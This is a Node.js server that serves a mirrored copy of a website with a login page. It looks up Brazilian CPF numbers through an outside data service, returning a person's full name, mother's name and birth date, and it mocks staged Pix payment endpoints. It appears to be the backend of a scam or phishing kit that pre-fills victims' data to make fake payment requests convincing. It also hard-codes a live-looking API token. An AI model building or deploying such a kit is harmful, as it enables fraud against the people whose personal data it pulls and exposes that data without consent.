const http = require("http");
const fs = require("fs");
const path = require("path");

const port = Number(process.env.PORT) || 8080;
const host = process.env.HOST || "127.0.0.1";
const baseDir = path.join(__dirname, "site-mirror");
const transactions = new Map();
const envPath = path.join(__dirname, ".env");

if (fs.existsSync(envPath)) {
  const lines = fs.readFileSync(envPath, "utf-8").split(/\r?\n/);
  for (const line of lines) {
    const trimmed = line.replace(/^\uFEFF/, "").trim();
    if (!trimmed || trimmed.startsWith("#")) continue;
    const idx = trimmed.indexOf("=");
    if (idx === -1) continue;
    const key = trimmed.slice(0, idx).trim();
    const value = trimmed.slice(idx + 1).trim();
    if (!process.env[key]) process.env[key] = value;
  }
}

const CPF_API_BASE = process.env.CPF_API_BASE || "https://snoopintelligence.cloud";
const CPF_API_TOKEN = process.env.CPF_API_TOKEN || "snp_Cl2OqLXM-bhZy-XwVj-g9hL-1Tbm8wFa2oNl";

const mimeTypes = {
  ".css": "text/css; charset=utf-8",
  ".gif": "image/gif",
  ".html": "text/html; charset=utf-8",
  ".jpeg": "image/jpeg",
  ".jpg": "image/jpeg",
  ".js": "application/javascript; charset=utf-8",
  ".json": "application/json; charset=utf-8",
  ".png": "image/png",
  ".svg": "image/svg+xml",
  ".woff": "font/woff",
  ".woff2": "font/woff2"
};

function send(res, statusCode, contentType, body) {
  res.writeHead(statusCode, { "Content-Type": contentType });
  res.end(body);
}

function sendJson(res, statusCode, payload) {
  send(res, statusCode, "application/json; charset=utf-8", JSON.stringify(payload));
}

function readBody(req) {
  return new Promise((resolve, reject) => {
    let body = "";
    req.on("data", chunk => {
      body += chunk;
    });
    req.on("end", () => {
      resolve(body);
    });
    req.on("error", reject);
  });
}

function normalizeCpf(cpf) {
  return String(cpf || "").replace(/\D/g, "");
}

function buildCpfApiUrl(cpf) {
  const apiUrl = new URL("/api/v2/generic/cpf", CPF_API_BASE);
  if (!["http:", "https:"].includes(apiUrl.protocol)) {
    throw new Error("CPF_API_BASE invalido");
  }
  apiUrl.searchParams.set("cpf", cpf);
  return apiUrl.toString();
}

function normalizeKey(key) {
  return String(key || "")
    .normalize("NFD")
    .replace(/[\u0300-\u036f]/g, "")
    .replace(/[^a-zA-Z0-9]/g, "")
    .toUpperCase();
}

function collectObjects(value, output = [], depth = 0) {
  if (!value || depth > 5) return output;
  if (Array.isArray(value)) {
    value.forEach((item) => collectObjects(item, output, depth + 1));
    return output;
  }
  if (typeof value === "object") {
    output.push(value);
    Object.values(value).forEach((item) => collectObjects(item, output, depth + 1));
  }
  return output;
}

function getField(source, keys) {
  if (!source || typeof source !== "object") return "";
  const keySet = new Set(keys.map(normalizeKey));
  for (const [key, value] of Object.entries(source)) {
    if (!keySet.has(normalizeKey(key))) continue;
    if (value == null) continue;
    const text = String(value).trim();
    if (text) return text;
  }
  return "";
}

function normalizeBirthDate(value) {
  const text = String(value || "").trim();
  if (!text) return "";
  if (/^\d{2}\/\d{2}\/\d{4}$/.test(text)) return text;
  if (/^\d{4}-\d{2}-\d{2}/.test(text)) return text.slice(0, 10);
  if (/^\d{8}$/.test(text)) return `${text.slice(0, 4)}-${text.slice(4, 6)}-${text.slice(6, 8)}`;
  return text;
}

function extractCpfData(payload, fallbackCpf) {
  const candidates = collectObjects(payload);
  const base =
    candidates.find((item) => getField(item, ["nome", "nome_completo", "name", "NOME"])) ||
    candidates[0] ||
    {};
  const nascimento = getField(base, [
    "data_nascimento",
    "dataNascimento",
    "nascimento",
    "nasc",
    "dt_nascimento",
    "data_nasc",
    "dtnasc",
    "birthdate",
    "birth_date"
  ]);

  return {
    cpf: normalizeCpf(getField(base, ["cpf", "documento", "document"]) || fallbackCpf),
    nome: getField(base, ["nome", "nome_completo", "nomeCompleto", "name"]),
    nome_mae: getField(base, ["nome_mae", "nomeMae", "nome_da_mae", "mae", "mae_nome", "mother", "motherName"]),
    data_nascimento: normalizeBirthDate(nascimento),
    sexo: getField(base, ["sexo", "genero", "gender"]),
    situacao_cadastral: getField(base, ["situacao_cadastral", "situacao", "status"]),
    manualEntry: false
  };
}

async function consultCpf(cpf) {
  const token = CPF_API_TOKEN;
  if (!token) {
    return {
      statusCode: 500,
      payload: { status: 500, statusMsg: "CPF_API_TOKEN nao configurado" }
    };
  }

  let apiUrl;
  try {
    apiUrl = buildCpfApiUrl(cpf);
  } catch {
    return {
      statusCode: 500,
      payload: { status: 500, statusMsg: "CPF_API_BASE nao configurado ou invalido" }
    };
  }
  let apiResp;
  let text = "";

  for (let attempt = 1; attempt <= 3; attempt += 1) {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 12000);
    try {
      apiResp = await fetch(apiUrl, {
        method: "GET",
        headers: {
          Authorization: `Bearer ${token}`,
          Accept: "application/json"
        },
        signal: controller.signal
      });
      text = await apiResp.text();
      if (apiResp.ok) break;
    } catch (error) {
      if (attempt === 3) {
        return {
          statusCode: 502,
          payload: { status: 502, statusMsg: "Falha ao consultar CPF", details: String(error) }
        };
      }
    } finally {
      clearTimeout(timeout);
    }
  }

  let data = {};
  try {
    data = JSON.parse(text);
  } catch {
    data = { raw: text };
  }

  const apiStatus = Number(data.status || data.statusCode || data.codigo);
  if (Number.isFinite(apiStatus) && apiStatus >= 400) {
    return { statusCode: apiStatus, payload: data };
  }

  if (!apiResp || !apiResp.ok) {
    return { statusCode: apiResp ? apiResp.status : 502, payload: data };
  }

  return {
    statusCode: 200,
    payload: {
      success: true,
      DADOS: extractCpfData(data, cpf)
    }
  };
}

function createMockPixCode(transactionId) {
  return `00020101021226850014br.gov.bcb.pix2563demo.local/pix/${transactionId}5204000053039865406127.005802BR5920RENOVE DEMO LOCAL6009SAO PAULO62070503***6304ABCD`;
}

function createTransaction(kind, body) {
  const id = `${kind}_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
  const depositId = `deposit_${Math.random().toString(36).slice(2, 10)}`;
  const amount = Number(body.amount || 127);
  const transaction = {
    transaction_id: id,
    deposit_id: depositId,
    kind,
    amount,
    customer_name: body.customer_name || "Usuario Demo",
    customer_cpf: normalizeCpf(body.customer_cpf),
    createdAt: Date.now(),
    approvedAt: null
  };

  transactions.set(id, transaction);
  transactions.set(depositId, transaction);

  return {
    success: true,
    transaction_id: id,
    deposit_id: depositId,
    amount,
    status: "pending",
    pix_code: createMockPixCode(id),
    qr_code: null
  };
}

async function handleApi(req, res, url) {
  if (req.method === "GET" && url.pathname === "/api/consulta.php") {
    const cpf = normalizeCpf(url.searchParams.get("cpf")).slice(0, 11);
    if (!cpf) {
      sendJson(res, 400, { status: 400, statusMsg: "Informe o CPF" });
      return true;
    }

    const response = await consultCpf(cpf);
    sendJson(res, response.statusCode, response.payload);
    return true;
  }

  if (req.method === "POST" && url.pathname === "/api/notify-approved") {
    let body = {};
    try {
      const rawBody = await readBody(req);
      body = rawBody ? JSON.parse(rawBody) : {};
    } catch (err) {
      sendJson(res, 400, {
        success: false,
        error: "Invalid JSON payload"
      });
      return true;
    }

    const id = String(body.id || body.transaction_id || body.deposit_id || "").trim();
    let transaction = id ? transactions.get(id) : null;

    if (!transaction) {
      const latestPending = Array.from(new Set(transactions.values()))
        .filter((item) => item && !item.approvedAt)
        .sort((a, b) => b.createdAt - a.createdAt)[0];
      transaction = latestPending || null;
    }

    if (!transaction) {
      sendJson(res, 404, {
        success: false,
        error: "Transaction not found"
      });
      return true;
    }

    transaction.approvedAt = Date.now();

    sendJson(res, 200, {
      success: true,
      message: "Mock approval registered",
      transaction_id: transaction.transaction_id,
      deposit_id: transaction.deposit_id,
      status: "paid"
    });
    return true;
  }

  if (
    req.method === "POST" &&
    ["/api/payment/payment.php", "/api/payment/payment_second.php", "/api/payment/payment_fixo.php"].includes(url.pathname)
  ) {
    let body = {};
    try {
      const rawBody = await readBody(req);
      body = rawBody ? JSON.parse(rawBody) : {};
    } catch (err) {
      sendJson(res, 400, {
        success: false,
        error: "Invalid JSON payload"
      });
      return true;
    }

    const kind = url.pathname.split("/").pop().replace(".php", "");
    sendJson(res, 200, createTransaction(kind, body));
    return true;
  }

  if (req.method === "GET" && url.pathname === "/api/payment/status/status.php") {
    const id = url.searchParams.get("id");
    const transaction = id ? transactions.get(id) : null;

    if (!transaction) {
      sendJson(res, 404, {
        success: false,
        error: "Transaction not found"
      });
      return true;
    }

    const status = transaction.approvedAt ? "paid" : "pending";

    sendJson(res, 200, {
      success: true,
      status,
      transaction_id: transaction.transaction_id,
      deposit_id: transaction.deposit_id
    });
    return true;
  }

  return false;
}

const server = http.createServer(async (req, res) => {
  const url = new URL(req.url, `http://${req.headers.host || "localhost"}`);

  if (url.pathname.startsWith("/api/")) {
    const handled = await handleApi(req, res, url);
    if (!handled) {
      sendJson(res, 404, {
        success: false,
        error: "Mock API route not found"
      });
    }
    return;
  }

  let urlPath = url.pathname;
  const ext = path.extname(urlPath).toLowerCase();
  let filePath = path.join(baseDir, urlPath);

  if (!ext) {
    if (urlPath === "/login") {
      filePath = path.join(baseDir, "login.html");
    } else {
      filePath = path.join(baseDir, "index.html");
    }
  }

  fs.readFile(filePath, (err, data) => {
    if (err) {
      send(res, 404, "text/html; charset=utf-8", "<h1>404 Not Found</h1>");
      return;
    }

    const mime = mimeTypes[path.extname(filePath).toLowerCase()] || "application/octet-stream";
    send(res, 200, mime, data);
  });
});

server.listen(port, host, () => {
  console.log(`Server: http://${host}:${port}`);
});
